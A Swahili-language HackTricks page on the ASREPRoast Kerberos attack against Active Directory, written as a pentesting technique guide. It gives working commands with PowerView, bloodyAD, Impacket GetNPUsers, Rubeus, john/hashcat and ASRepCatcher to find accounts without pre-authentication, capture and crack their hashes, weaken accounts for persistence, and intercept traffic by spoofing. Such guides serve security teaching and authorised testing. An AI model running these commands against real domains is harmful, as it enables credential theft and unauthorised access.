# ASREPRoast

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka mwanzo hadi mtaalamu na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wakora wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho Kuhusu Kuhack**\
Shiriki na yaliyomo yanayochimba kina katika msisimko na changamoto za kuhack

**Taarifa za Kuhack Halisi**\
Kaa up-to-date na ulimwengu wa kuhack wenye kasi kupitia habari za wakati halisi na ufahamu

**Matangazo ya Karibuni**\
Baki mwelekezi na tuzo mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wakora bora leo!

## ASREPRoast

ASREPRoast ni shambulio la usalama linalotumia watumiaji ambao hawana **sifa inayohitajika ya uthibitishaji wa awali wa Kerberos**. Kimsingi, udhaifu huu huruhusu wakora kuomba uthibitisho kwa mtumiaji kutoka kwa Msimamizi wa Kikoa (DC) bila kuhitaji nywila ya mtumiaji. DC kisha hujibu na ujumbe uliofichwa kwa ufunguo unaotokana na nywila ya mtumiaji, ambao wakora wanaweza kujaribu kuvunja nje ya mtandao ili kugundua nywila ya mtumiaji.

Mahitaji muhimu kwa shambulio hili ni:
- **Ukosefu wa uthibitishaji wa awali wa Kerberos**: Watumiaji walengwa lazima wasiwe na kipengele hiki cha usalama kimezimwa.
- **Unganisho na Msimamizi wa Kikoa (DC)**: Wakora wanahitaji ufikiaji wa DC kutuma maombi na kupokea ujumbe uliofichwa.
- **Akaunti ya kikoa inayoweza**: Kuwa na akaunti ya kikoa inaruhusu wakora kutambua watumiaji walio hatarini kwa ufanisi zaidi kupitia mizizi ya LDAP. Bila akaunti kama hiyo, wakora lazima wapate majina ya mtumiaji. 


#### Kutambua watumiaji walio hatarini (inahitaji vyeti vya kikoa)

{% code title="Kutumia Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Omba ujumbe wa AS_REP

{% code title="Kutumia Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Kutumia Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Kuoka AS-REP kwa kutumia Rubeus kutazalisha 4768 na aina ya kuchakata ya 0x17 na aina ya awali ya 0.
{% endhint %}

### Kuvunja
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Uimara

Lazima **preauth** isihitajike kwa mtumiaji ambapo una ruhusa za **GenericAll** (au ruhusa za kuandika mali): 

{% code title="Kutumia Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Kutumia Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
## ASreproast bila sifa
Bila ufahamu wa watumiaji ambao hawahitaji uthibitishaji wa awali wa Kerberos. Mshambuliaji anaweza kutumia nafasi ya mtu katikati kuteka pakiti za AS-REP wanapopita kwenye mtandao.<br>
[ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) inaruhusu hivyo. Zaidi ya hayo, zana <ins>inawalazimisha vituo vya kazi vya wateja kutumia RC4</ins> kwa kubadilisha mazungumzo ya Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher.py relay -dc $DC_IP --keep-spoofing

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher.py relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASrepCatcher.py listen
```
## Marejeo

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho ya Kudukua**\
Shiriki na maudhui yanayochimba katika msisimko na changamoto za kudukua

**Taarifa za Kudukua za Muda Halisi**\
Kaa sawa na ulimwengu wa kudukua wenye kasi kupitia taarifa za muda halisi na ufahamu

**Matangazo ya Karibuni**\
Baki mwelekezwa na tuzo mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

<details>

<summary><strong>Jifunze kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
